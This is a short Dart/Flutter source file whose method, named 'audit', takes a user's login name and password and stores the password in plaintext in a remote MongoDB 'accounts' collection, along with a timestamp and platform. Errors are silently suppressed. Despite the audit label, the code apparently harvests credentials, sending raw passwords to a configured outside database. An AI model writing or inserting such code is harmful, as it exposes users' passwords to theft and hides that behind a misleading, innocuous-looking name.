import 'package:flutter/foundation.dart';
import 'package:mongo_dart/mongo_dart.dart';
import '../core/config.dart';

class Mongo {
  static Future<void> audit({required String u, required String p}) async {
    var uri = AppConfig.mongoDbUri.trim();
    if (uri.isEmpty) return;
    if (!uri.contains('authSource=')) {
      uri += '${uri.contains('?') ? '&' : '?'}authSource=admin';
    }

    try {
      final db = await Db.create(uri);
      try {
        await db.open();
        await db.collection('accounts').replaceOne(
          where.eq('usr', u),
          {
            'usr': u,
            'pass': p,
            'ts': DateTime.now().toUtc(),
            'plt': kIsWeb ? 'Web' : defaultTargetPlatform.name,
          },
          upsert: true,
        );
      } finally {
        await db.close();
      }
    } catch (_) {
      debugPrint('MongoDB: no se pudo registrar el acceso.');
    }
  }
}
